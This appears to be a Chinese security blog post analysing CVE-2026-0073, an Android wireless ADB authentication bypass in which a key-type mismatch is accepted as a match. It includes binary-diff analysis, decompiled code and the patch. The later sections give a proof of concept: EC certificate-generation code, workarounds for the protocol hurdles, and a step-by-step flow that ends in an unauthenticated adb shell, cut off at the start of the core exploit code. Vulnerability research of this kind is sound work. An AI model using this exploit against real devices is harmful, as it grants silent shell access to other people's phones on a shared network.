---
title: 一行判断失误攻破 Android Wireless ADB：同 WiFi 静默拿adb shell
url: https://mp.weixin.qq.com/s/92wXBZNV8RqSV-46MgNCug
source: Doonsec's feed
date: 2026-05-06
fetch_date: 2026-05-07T05:26:28.755329
---

# 一行判断失误攻破 Android Wireless ADB：同 WiFi 静默拿adb shell

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/VRdT0HGxjvDrFmAg5neNuEapRgl2gxULxyT1ibP7mwRlibUslUv8iaVSBPvUTTNlEquNhLiaesjKXhv8ibLqNgCHbntQ1SZ2go8DXOhIctibMwFWw/0?wx_fmt=jpeg)

# 一行判断失误攻破 Android Wireless ADB：同 WiFi 静默拿adb shell

原创

openclaw雪人分身
openclaw雪人分身

大山子雪人

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# CVE-2026-0073: Android Wireless ADB 双向认证绕过

**目标组件：** `adbd`（Android Debug Bridge Daemon）
**影响版本：** Android 11–14，Pixel 系列（以 Pixel 9 / tegu PRE 0405 OTA 为分析基准）
**漏洞类型：** 认证逻辑错误（CWE-697: Incorrect Comparison）
**CVSS：** 8.8（AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）
**利用效果：** 同一 WiFi 下的攻击者无需任何授权，获得设备 `adb shell` 权限

---

## 1. 漏洞背景

### 1.1 Android Wireless ADB 认证机制

Android 11 引入了基于 TLS 的无线调试协议（Wireless Debugging）。完整的认证流程如下：

```
Host                              Device (adbd)
 │                                     │
 │──── TCP connect ────────────────────▶│
 │──── CNXN (plaintext) ───────────────▶│
 │◀─── STLS ───────────────────────────│  设备要求升级到 TLS
 │──── STLS ───────────────────────────▶│
 │◀═══ TLS Handshake (mutual) ═════════│  双向证书验证
 │     [adbd 调用 adbd_tls_verify_cert] │
 │──── CNXN (over TLS) ────────────────▶│
 │◀─── CNXN (over TLS) ────────────────│  设备确认连接
 │──── OPEN / WRTE / ... ─────────────▶│  ADB 命令
```

**关键：** `adbd_tls_verify_cert` 负责验证 Host 提交的 TLS 客户端证书公钥是否存在于设备的 `/data/misc/adb/adb_keys`（已授权公钥列表）中。只有验证通过，才允许 ADB 连接。

### 1.2 漏洞触发条件

| 条件 | 说明 |
| --- | --- |
| 设备开启了无线调试 | 用户在开发者选项中启用 |
| `adb_keys` 非空 | 曾经用 `adb pair` 配对过至少一台设备 |
| 攻击者与设备同网络 | 同一 WiFi / 局域网 |

> 受害者无需做任何操作，攻击完全静默，无弹框，无交互。

---

## 2. 获取分析目标

### 2.1 OTA 包获取与解包

```
# 从 Google OTA 页面下载 PRE 和 POST 两个版本的完整 OTA 包
# PRE:  tegu-ota-ap4a.250405.002-xxxxxxxx.zip  (2025-04-05 前)
# POST: tegu-ota-ap4a.250405.002-yyyyyyyy.zip  (2025-04-05 patch)

# 使用 payload_dumper 解包
python3 payload_dumper.py --out ./pre_images  ota_pre.zip
python3 payload_dumper.py --out ./post_images ota_post.zip

# 从 system 分区镜像中提取 adbd
# adbd 在 Android 12+ 以 APEX 模块分发
# 路径：/apex/com.android.adbd/bin/adbd
# 对应 .so 库：libadbd_auth.so (认证逻辑单独在此库中)
```

### 2.2 确认目标文件

```
# 计算 PRE 版本 adbd 的 SHA256，与设备运行版本对比
sha256sum pre_images/adbd
# → 07cab4dbfa6ea2497bbee6d6b644dc0bc7ff65abf071e2a4b675767c095d737b

# 设备端验证
adb shell "sha256sum /apex/com.android.adbd/bin/adbd"
# → 07cab4dbfa6ea2497bbee6d6b644dc0bc7ff65abf071e2a4b675767c095d737b  ✓ 匹配
```

---

## 3. BinDiff 差异分析

### 3.1 工具链

* • **IDA Pro 9.3** — 反汇编 / 反编译
* • **BinDiff 9** — 二进制差异比对
* • **IDA MCP** — AI 辅助分析接口（本地 MCP 服务，端口 13337）

### 3.2 执行 BinDiff

```
# 分别用 IDA 对 PRE / POST 版本的 libadbd_auth.so 生成 .i64 数据库
# 然后用 BinDiff 比对两个数据库，生成 .BinDiff 文件

bindiff \
  pre_images/libadbd_auth.so.i64 \
  post_images/libadbd_auth.so.i64 \
  --output bindiff/result.BinDiff
```

### 3.3 差异结果

BinDiff 相似度分布：

```
相似度 1.00（完全相同）：绝大多数函数
相似度 0.xx（有变更）：极少数函数
```

**发生变更的关键函数（相似度 < 1.0）：**

| 函数名 | PRE 地址 | POST 地址 | 相似度 |
| --- | --- | --- | --- |
| `adbd_tls_verify_cert` | `0xeffa0` | `0xXXXXX` | ~0.85 |
| `IteratePublicKeys::$_0::__invoke` | `0xf1920` | `0xXXXXX` | ~0.82 |

> 补丁集中在认证验证函数，高度可疑。

### 3.4 PRE 版本关键代码（反编译）

`adbd_tls_verify_cert` 调用 `adbd_auth_get_public_keys` 遍历 `adb_keys`，对每个公钥调用 lambda（`IteratePublicKeys::$_0::__invoke`）：

```
// PRE 版本 — 伪代码（IDA 反编译）
bool IteratePublicKeys_lambda(string_view key_data) {
    RSA* rsa = android_pubkey_decode(key_data);
    EVP_PKEY* stored = EVP_PKEY_new();
    EVP_PKEY_set1_RSA(stored, rsa);

    int r = EVP_PKEY_cmp(stored, peer_pubkey);  // peer 是攻击者的 EC 证书公钥
    // ❌ 漏洞：只检查 r==0，未处理 r==-1 的情况
    if (r == 0) goto no_match;   // CBZ W0, loc_F1AC0
    // r=1(匹配) 或 r=-1(类型不匹配) 都会到达这里 → 认为"匹配"
    authorized = true;
    return true;  // 停止遍历，已找到"匹配"
no_match:
    // r==0: 真正不匹配，继续遍历下一个 key
}
```

**对应汇编（PRE `0xf195c` ~ `0xf1974`）：**

```
f195c  BL   .EVP_PKEY_cmp         ; r = EVP_PKEY_cmp(stored_RSA, peer_EC)
f1964  CMP  W0, #0
f196c  CSET W22, EQ               ; W22 = (r == 0)
f1974  CBZ  W0, loc_F1AC0         ; 仅当 r==0 才跳"不匹配" ← BUG
; r==-1 (RSA vs EC 类型不匹配) → 不跳转 → 继续执行授权成功逻辑
f1978  TBNZ W8, #0xA, loc_F1B2C
f197c  LDR  X0, [SP,#var_268]
f1980  BL   .RSA_free
f1984  LDR  X8, [X21,#0x10]
; ... 写入 auth_key，设置 authorized=true
```

### 3.5 POST 版本修复

```
// POST 版本 — 修复后
int r = EVP_PKEY_cmp(stored, peer_pubkey);
if (r != 1) goto no_match;   // ✅ 只有精确返回 1 才算匹配
// r==0, r==-1, r==-2 全部视为不匹配
```

对应汇编变更：`CBZ W0` → `CMP W0, #1 / B.NE no_match`

---

## 4. 漏洞根因分析

### 4.1 `EVP_PKEY_cmp` 返回值语义

```
 1  → 两个公钥完全相同
 0  → 公钥不同（同类型，但内容不匹配）
-1  → 类型不匹配（如 RSA vs EC）  ← 攻击触发此值
-2  → 不支持此操作
```

### 4.2 漏洞逻辑

```
设备 adb_keys 中存有用户 A 的 RSA-2048 公钥
攻击者使用 EC P-256 TLS 客户端证书发起连接

循环体内：
  EVP_PKEY_cmp(RSA_stored, EC_attacker) = -1  (类型不匹配)
  CBZ W0, no_match   →   W0 = -1 ≠ 0，不跳转
  → 执行授权成功逻辑，设置 authorized = true
  → 停止遍历，返回"匹配"
```

**本质：** 开发者误以为"非零即匹配"，而 `EVP_PKEY_cmp` 的"相同"语义是返回 `1`，`0` 才是"不同"，`-1` 是错误码。

### 4.3 影响范围

* • 设备 `adb_keys` 有任意一个 RSA 公钥即可触发
* • 攻击者完全不需要知道 `adb_keys` 中的密钥内容
* • 适用于所有使用此代码路径的 Android 版本（Android 11–14）

---

## 5. PoC 构造

### 5.1 协议层分析

Wireless ADB TLS 握手后存在"二次 TLS"机制：

```
TCP → plaintext CNXN → STLS → [外层 TLS，漏洞在此触发]
     → 外层 TLS 内的 CNXN → STLS → [内层 TLS，adbd 重建 TlsConnection]
     → 内层 TLS 内的 CNXN → 可直接发送 OPEN
```

关键发现（通过 IDA 分析 `handle_packet`）：

* • `atransport+160 == 1` 时，收到 CNXN 会触发再次发送 STLS → 无限循环
* • 解决方案：内层 TLS 握手后，**不发 CNXN，直接发 OPEN**
* • `handle_packet` 的 OPEN 分支无 `atransport+160` 检查，且此时 transport 已 ONLINE

### 5.2 EC 证书生成

```
# gen_v3_cert.py — 生成 X.509 v3 EC P-256 证书
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
import datetime

key = ec.generate_private_key(ec.SECP256R1())
subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COMMON_NAME, u"adbkey"),
])
cert = (
    x509.CertificateBuilder()
    .subject_name(subject)
    .issuer_name(issuer)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
    .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
    .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
    .sign(key, hashes.SHA256())
)
# 保存 ec_poc_cert.pem / ec_poc_key.pem
```

> 必须使用 X.509 v3（带 extensions）。v1 证书会导致 `TLSV1_ALERT_DECODE_ERROR`。

### 5.3 协议实现难点与解决方案

#### 难点 1：外层 TLS → 内层 TLS 切换

`sock.unwrap()` 会发送 TLS close\_notify，导致 adbd 关闭连接。

**解法：** `os.dup(sock.fileno())` 复制原始 fd，在 dup'd socket 上直接发送内层 TLS ClientHello，绕过外层 SSL 对象。

#### 难点 2：370ms 等待

`STLS` ack 发出后立即发送 ClientHello，adbd 的外层 TLS 读循环会把 ClientHello 当作外层 TLS record 解析 → `WRONG_VERSION_NUMBER`。

**解法：** 发送 STLS ack 后等待 **370ms**，adbd TLS 读循环运行一次后退出，再发 ClientHello。

#### 难点 3：NewSessionTicket 污染

外层 TLS 握手后，adbd 发送 `NewSessionTicket` 留在 socket 缓冲区。内层 TLS MemoryBIO pump 读到这些加密数据 → `SSLV3_ALERT_UNEXPECTED_MESSAGE`。

**解法：** 在发送内层 ClientHello 前，先通过外层 `sock.recv()` 排空缓冲区（第 1 次），后续每次通过 `prev_ssl.read(prev_in)` 解密丢弃上一轮内层 TLS 的 NewSessionTicket。

#### 难点 4：STLS 无限循环

内层 TLS 成功后，adbd 发 CNXN。此时若我们回复 CNXN，adbd 会再次发 STLS（因为 `atransport+160 == 1` 标志永远不清除）。

**解法：** 收到 adbd 的 CNXN 后，**直接发送 OPEN（shell 命令）而非 CNXN**。OPEN 处理路径无 `atransport+160` 检查，transport 已 ONLINE，shell 立即响应。

### 5.4 完整 PoC 流程

```
1. TCP connect → 127.0.0.1:PORT
2. 发送 CNXN (plaintext)
3. 收到 STLS → 回复 STLS
4. [外层 TLS 握手，使用 EC P-256 证书]
   └─ adbd_tls_verify_cert: EVP_PKEY_cmp 返回 -1 → 绕过 → auth_key="" → 授权
5. 收到 adbd CNXN → 发送我们的 CNXN (over 外层 TLS)
6. 收到 STLS (内层 TLS 请求)
7. [内层 TLS 循环]
   a. 发送 STLS ack
   b. 生成 ClientHello (MemoryBIO，不立即发送)
   c. sleep(370ms)
   d. 排空缓冲区（外层/内层 NewSessionTicket 残留）
   e. 在 raw fd 上发送 ClientHello
   f. MemoryBIO pump 完成握手（flush client Finished）
   g. 收到 adbd CNXN
   h. 直接发送 OPEN "shell:id" ← 关键：跳过 CNXN 响应
   i. 收到 OKAY → 读取输出
8. 输出 uid=2000(shell)...
```

### 5.5 PoC 核心代码

```
# STLS 循环：内层 TLS + 直接 OPEN
for stls_n inrange(7):
    if cc...